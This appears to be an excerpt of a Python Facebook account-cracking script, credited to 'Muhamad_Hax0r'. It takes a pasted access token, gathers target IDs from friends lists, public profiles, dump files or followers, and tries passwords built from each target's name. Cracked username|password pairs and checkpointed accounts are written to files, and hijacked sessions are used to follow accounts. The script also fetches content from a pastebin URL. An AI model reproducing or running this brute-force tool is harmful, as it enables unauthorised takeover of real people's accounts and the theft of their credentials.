...
try:
    rq = requests.get('https://pastebin.com/raw/T4RycMEd').text
...
def logo():
        ...
        print("")
        print("%s-------------------------------------"%(Z))
        print("%s%s  Author   : Muhamad_Hax0r                  %s"%(Z,P,Z))
        print("%s%s  Github   : https://github.com/Muhammad-Hax0r %s"%(Z,P,Z))
        print("%s%s  Channel  : https://t.me/Haxor_decrypter%s"%(Z,P,Z))
        print("%s-------------------------------------"%(Z))
        print("")
...
def result(OK,cp):
    if len(OK) != 0 or len(cp) != 0:
        ...
        print("\033[93;1m TOTAL \033[92;1msuccessfully\033[93;1m/\033[91;1mCP: %s/%s"%(str(len(ok)),str(len(cp))))
        os.sys.exit()
    else:
...
def azim():
    os.system('clear')
    logo()
    print(" %s              LOGIN NEW FB "%(H))
    print("")
    cookie = input("\n %s[%s?%s] \033[1;97mPASTE TOKEN : %s"% (P,P,P,P))
    try:
...
def Hax0r():
    ...
    print('')
    print('%s \033[1;97m[%s\033[1;97m1=%s] %s\033[1;97mCRACK With Friends List'%(P,N,P,P));time.sleep(0.03)
    print('%s \033[1;97m[%s\033[1;97m2=%s] %sCRACK With PUBLIC ID%s'%(P,N,P,P,P));time.sleep(0.03)
    print('%s \033[1;97m[%s\033[1;97m3=%s] %sCRACK With File Id Dumps'%(P,N,P,P));time.sleep(0.03)
    print('%s \033[1;97m[%s\033[1;97m4=%s] %s\033[1;97mCRACK With Followers'%(P,N,P,P));time.sleep(0.03)
    print('%s [%s0=%s] %sLOGOUT %s'%(P,P,P,P,N));time.sleep(0.03)
    pepek = input('\n \033[1;97m%s[%s?%s] \033[1;97mchoice : '%(N,P,N))
    if pepek == '':
        print("\n %s[%s×%s] DON'T EMPTY... !"%(H,H,H));time.sleep(2);Hax0r()
    elif pepek in['1','01']:
            try:
                print("\n ID DANE")
                user = input(' ID: ')
                ...
                print('\n %s[%s×%s] FAILED TO RETRIEVE ID, PROBABLY ID IS NOT PUBLIC'%(H,H,H));time.sleep(3);Hax0r()
    elif pepek in['2','02']:
        _ngocok_(tokenz)
        ...
        print('\n %s[%s×%s] MENU [%s%s%s] NOT FOUND, CHECK THE MENU BRO!'%(N,M,N,M,pepek,N));time.sleep(2);Hax0r()
...
def _ngocok_(__ppk__):
    ...
    for mnh in range(nanya_keun):
        ...
        try:
            ...
            print('\n [×] FAILED TO RETRIEVE ID, PROBABLY ID IS NOT PUBLIC');time.sleep(3);Hax0r()
...
class __crack__:
    ...
    def plerr(self,id):
        self.id = id
        print('\n \033[1;97m[%s+%s] ALL IDS : %s%s%s' %(H,H,H,len(self.id),H))
        ___mrerror___ = input(' [%s?%s] USE DEFAULT /MANUAL PASSWORD [d/m]: '%(H,H))
            ...
            while True:
                ...
                if pwek == '':
                    ...
                    def __chi__(ysc=None): 
                        logo()
                        print("\033[97;1m ALL IDS : \033[97;1m"+str(len(self.id)))
                        print("\033[97;1m Coded by Hax0r\x1b[0m")
                        print("\033[97;1m Cracking Starting wait 15 min and 30min \033[97;1m\033[97;1m\x1b[0m")
                        print("\033[1;97m !!! To Stop Scrit CTRL+Z")
                        linex()
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f'\r {P}[{P}Hax0r{P}] {P}{loop}{P}/{P}{len(self.id)} {H}Successfully:{len(ok)} - {P}CHEK:{len(cp)} '),
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f'\r {H}[successfully] {P}{user}|{pw}{P}')
                    wrt = '  %s|%s' % (user,pw)
                    ok.append(wrt)
                    open('successfully-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    print(f'\r {P}[checkpoint] {user}|{pw}{N}')
                    wrt = '  %s|%s' % (user,pw)
                    cp.append(wrt)
                    open('checkpoint-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
...
#    <- Bot followers ->
    ...
    def __pler__(self):
        logo()
        print("\033[97;1m ALL IDS : \033[92;1m"+str(len(self.id)))
        print("\033[97;1m Coded by Hax0r\x1b[0m")
        print("\033[97;1m Cracking Starting plaese wait 15 min and 30min \033[97;1m\033[97;1m\x1b[0m")
        print("\033[1;97m !!! To Stop Script CTRL+Z")
        linex()
            ...
            for yntkts in self.id: 
                try:
                    ...
                    if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                        pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345", xz[0]+xz[1]+"123456789", xz[0]+xz[1]+"11223344", xz[0]+xz[1]+"112233"]
                    else:
                        pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345", xz[0]+xz[1]+"123456789", xz[0]+xz[1]+"11223344", xz[0]+xz[1]+"112233"]
